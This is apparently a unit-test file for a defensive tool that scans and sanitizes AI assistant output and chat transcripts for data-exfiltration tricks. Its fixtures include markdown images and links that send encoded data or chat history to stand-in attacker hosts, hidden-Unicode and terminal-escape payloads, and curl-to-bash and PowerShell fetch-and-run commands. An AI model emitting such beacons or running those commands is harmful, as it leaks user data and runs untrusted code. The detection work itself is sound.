import json, os, subprocess, sys, unittest
HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, ROOT)
import outfence as of
EX = os.path.join(ROOT, "examples")
CLI = [sys.executable, os.path.join(ROOT, "outfence.py")]


def rules(text, allow=()):
    return [f["rule"] for f in of.scan_text(text, "t", allow)]


def find(text, rule, allow=()):
    return [f for f in of.scan_text(text, "t", allow) if f["rule"] == rule]


class TestImages(unittest.TestCase):
    def test_plain_external_image_is_high(self):
        f = find("![a](https://cdn.example.org/logo.png)", "OF01")
        self.assertEqual(len(f), 1)
        self.assertEqual(f[0]["severity"], "high")

    def test_image_with_encoded_data_is_critical(self):
        f = find("![a](https://x.evil.example/p.png?d=U2VjcmV0IHByb2plY3QgYmx1ZWJpcmQ)", "OF01")
        self.assertEqual(f[0]["severity"], "critical")
        self.assertIn("encoded", f[0]["detail"])

    def test_image_with_template_placeholder(self):
        f = find("![a](https://x.evil.example/{{chat_history}}.png)", "OF01")
        self.assertEqual(f[0]["severity"], "critical")

    def test_reference_style_image(self):
        t = "Look ![img][r]\n\n[r]: https://x.evil.example/a.png?q=aGVsbG8gd29ybGQgdGhpcyBpcyBkYXRh\n"
        f = find(t, "OF01")
        self.assertEqual(len(f), 1)
        self.assertIn("reference", f[0]["detail"])

    def test_relative_image_ok(self):
        self.assertEqual(rules("![d](./img/diagram.png)"), [])

    def test_allowlisted_host_ok(self):
        self.assertEqual(rules("![a](https://cdn.example.org/p.png?d=U2VjcmV0IHByb2plY3QgYmx1ZWJpcmQ)", ["*.example.org"]), [])

    def test_allowlist_apex_via_wildcard(self):
        self.assertTrue(of.host_allowed("example.org", ["*.example.org"]))
        self.assertFalse(of.host_allowed("evilexample.org", ["*.example.org"]))

    def test_protocol_relative(self):
        self.assertIn("OF01", rules("![a](//x.evil.example/a.png)"))


class TestHtml(unittest.TestCase):
    def test_img_tag(self):
        self.assertIn("OF02", rules('<img src="https://t.evil.example/p.gif">'))

    def test_iframe_and_script(self):
        r = rules('<iframe src="https://a.evil.example/"></iframe><script src=https://b.evil.example/x.js></script>')
        self.assertEqual(r.count("OF02"), 2)

    def test_css_url_and_import(self):
        r = rules('<div style="background:url(https://a.evil.example/x.png)"></div>\n@import "https://b.evil.example/s.css";')
        self.assertEqual(r.count("OF02"), 2)

    def test_meta_refresh(self):
        self.assertIn("OF02", rules('<meta http-equiv="refresh" content="0;url=https://a.evil.example/">'))


class TestLinksAndSecrets(unittest.TestCase):
    def test_normal_link_ok(self):
        self.assertEqual(rules("[docs](https://docs.python.org/3/library/pathlib.html)"), [])

    def test_data_link(self):
        f = find("[x](https://a.evil.example/v?q=user%20asked%20about%20the%20merger%20with%20acme%20next%20year)", "OF03")
        self.assertEqual(len(f), 1)

    def test_secret_param_in_url(self):
        f = find("see https://a.evil.example/c?api_key=FAKE-EXAMPLE-0000", "OF04")
        self.assertEqual(f[0]["severity"], "critical")

    def test_secret_shape_in_url_built_at_runtime(self):
        key = "gh" + "p_" + "FAKEEXAMPLE" + "0" * 20
        self.assertIn("OF04", rules("![a](https://a.evil.example/p?x=%s)" % key))

    def test_short_secret_param_ignored(self):
        self.assertNotIn("OF04", rules("https://a.evil.example/c?token=abc"))

    def test_bare_url_trailing_punct(self):
        self.assertEqual(rules("Go to https://docs.python.org/3/."), [])

    def test_ip_and_punycode_and_shortener(self):
        self.assertIn("OF09", rules("http://198.51.100.7/a"))
        self.assertIn("OF09", rules("https://xn--pple-43d.com/"))
        self.assertIn("OF09", rules("https://bit.ly/abc"))


class TestSchemesTerminalUnicode(unittest.TestCase):
    def test_javascript_link(self):
        f = find("[x](javascript:alert(1))", "OF05")
        self.assertEqual(f[0]["severity"], "high")

    def test_data_image_is_medium(self):
        f = find("![x](data:image/png;base64,iVBORw0KGgo=)", "OF05")
        self.assertEqual(f[0]["severity"], "medium")

    def test_osc52(self):
        f = find("ok\x1b]52;c;ZWNobyBoaQ==\x07", "OF06")
        self.assertEqual(f[0]["severity"], "critical")

    def test_osc8(self):
        self.assertIn("OSC 8", find("\x1b]8;;https://e.example/\x1b\\x\x1b]8;;\x1b\\", "OF06")[0]["detail"])

    def test_csi_conceal(self):
        self.assertIn("OF06", rules("a \x1b[8mhidden\x1b[0m b"))

    def test_tag_decoded(self):
        t = "hi" + "".join(chr(0xE0000 + ord(c)) for c in "leak it")
        f = find(t, "OF07")
        self.assertEqual(f[0]["severity"], "high")
        self.assertIn("leak it", f[0]["detail"])

    def test_zero_width_and_bidi(self):
        self.assertIn("OF07", rules("a\u200bb"))
        self.assertIn("OF07", rules("a\u202eb"))

    def test_leading_bom_and_emoji_vs_ok(self):
        self.assertEqual(rules("\ufeffHello \u2764\ufe0f"), [])

    def test_zwj_emoji_sequence_still_flagged_as_zero_width(self):
        # ZWJ is reported (medium) — documented trade-off
        self.assertIn("OF07", rules("\U0001F468\u200d\U0001F4BB"))


class TestShell(unittest.TestCase):
    def test_curl_pipe_sh(self):
        self.assertIn("OF08", rules("run: curl -fsSL https://get.example/i.sh | sudo bash"))

    def test_powershell_iex(self):
        self.assertIn("OF08", rules("irm https://get.example/i.ps1 | iex"))

    def test_plain_curl_ok(self):
        self.assertNotIn("OF08", rules("curl -o out.json https://api.example/data"))


class TestSanitize(unittest.TestCase):
    def test_removes_image_keeps_text(self):
        out = of.sanitize("Hi ![a](https://x.evil.example/p.png) there")
        self.assertEqual(out, "Hi [image removed: x.evil.example] there")

    def test_keeps_allowlisted_and_relative(self):
        t = "![a](https://cdn.example.org/p.png) ![b](./b.png)"
        self.assertEqual(of.sanitize(t, ["cdn.example.org"]), t)

    def test_strips_escapes_and_invisibles(self):
        t = "a\x1b]52;c;ZWNobw==\x07b\u200bc" + chr(0xE0041)
        self.assertEqual(of.sanitize(t), "abc")

    def test_sanitized_example_is_clean_of_high(self):
        with open(os.path.join(EX, "exfil_response.md"), encoding="utf-8") as fh:
            raw = fh.read()
        out = of.sanitize(raw)
        bad = [f for f in of.scan_text(out) if f["severity"] in ("high", "critical")]
        self.assertEqual(bad, [], bad)

    def test_html_tag_removed(self):
        self.assertIn("[img removed: t.evil.example]", of.sanitize('<img src="https://t.evil.example/a.gif" width=1>'))

    def test_javascript_link_removed_cleanly(self):
        self.assertEqual(of.sanitize("[go](javascript:alert(1))"), "go [link removed: javascript: URL]")


class TestTranscripts(unittest.TestCase):
    def test_assistant_only_by_default(self):
        units = of.load_units(os.path.join(EX, "transcript.json"))
        self.assertEqual(len(units), 1)
        self.assertIn("assistant", units[0][0])

    def test_all_roles(self):
        self.assertEqual(len(of.load_units(os.path.join(EX, "transcript.json"), all_roles=True)), 3)

    def test_jsonl_and_anthropic_blocks(self):
        import tempfile
        d = tempfile.mkdtemp()
        p = os.path.join(d, "t.jsonl")
        with open(p, "w") as fh:
            fh.write(json.dumps({"role": "user", "content": "hi"}) + "\n")
            fh.write(json.dumps({"type": "message", "role": "assistant",
                                 "content": [{"type": "text", "text": "![a](https://x.evil.example/a.png)"}]}) + "\n")
        units = of.load_units(p)
        self.assertEqual(len(units), 1)
        self.assertIn("OF01", [f["rule"] for f in of.scan_text(units[0][1])])

    def test_openai_choices(self):
        msgs = list(of._iter_messages({"choices": [{"message": {"role": "assistant", "content": "x"}}]}))
        self.assertEqual(msgs, [("assistant", "x")])


class TestCLI(unittest.TestCase):
    def run_cli(self, *args, stdin=None):
        return subprocess.run(CLI + list(args), capture_output=True, text=True, input=stdin)

    def test_examples_exit_1(self):
        p = self.run_cli(EX)
        self.assertEqual(p.returncode, 1, p.stderr)
        self.assertIn("OF01", p.stdout)

    def test_every_rule_triggered_by_examples(self):
        p = self.run_cli(EX, "--json")
        got = {f["rule"] for f in json.loads(p.stdout)["findings"]}
        self.assertEqual(got, set(of.RULES))

    def test_clean_exit_0(self):
        p = self.run_cli(os.path.join(EX, "clean_response.md"))
        self.assertEqual(p.returncode, 0)
        self.assertIn("no findings", p.stdout)

    def test_stdin(self):
        p = self.run_cli("-", "--json", stdin="![a](https://x.evil.example/a.png)")
        self.assertEqual(p.returncode, 1)
        self.assertEqual(json.loads(p.stdout)["findings"][0]["rule"], "OF01")

    def test_fail_on_threshold(self):
        p = self.run_cli("-", "--fail-on", "critical", stdin="![a](https://x.evil.example/a.png)")
        self.assertEqual(p.returncode, 0)

    def test_min_severity_filters(self):
        p = self.run_cli("-", "--json", "--min-severity", "medium", stdin="http://198.51.100.7/")
        self.assertEqual(json.loads(p.stdout)["findings"], [])

    def test_sanitize_cli(self):
        p = self.run_cli("--sanitize", "-", stdin="x ![a](https://x.evil.example/a.png)")
        self.assertEqual(p.stdout, "x [image removed: x.evil.example]")

    def test_missing_file_exit_2(self):
        self.assertEqual(self.run_cli("/nonexistent/file.md").returncode, 2)

    def test_no_args_exit_2(self):
        self.assertEqual(self.run_cli().returncode, 2)

    def test_bad_json_exit_2(self):
        import tempfile
        p = os.path.join(tempfile.mkdtemp(), "x.json")
        with open(p, "w") as fh:
            fh.write("{bad")
        self.assertEqual(self.run_cli(p).returncode, 2)

    def test_list_rules(self):
        p = self.run_cli("--list-rules")
        self.assertEqual(p.returncode, 0)
        self.assertEqual(len(p.stdout.strip().splitlines()), len(of.RULES))


if __name__ == "__main__":
    unittest.main()
